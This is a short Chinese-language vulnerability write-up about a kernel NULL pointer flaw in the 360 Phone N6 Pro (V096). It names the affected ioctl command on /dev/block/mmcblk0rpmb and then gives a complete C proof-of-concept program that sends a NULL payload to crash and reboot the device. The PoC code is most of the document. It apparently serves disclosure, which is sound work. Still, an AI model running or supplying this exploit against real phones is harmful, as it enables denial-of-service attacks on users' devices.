# 360 Phone N6 Pro内核漏洞

## 一、漏洞简介

360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令**3235427072**在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。

## 二、漏洞影响

- 名称：360 Phone N6 Pro
- 型号：1801-A01
- 安卓版本：7.1.1
- 版本号：V096
- 内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64

## 三、复现过程

### poc

```
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd < 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 > /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) < 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 > /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
}
```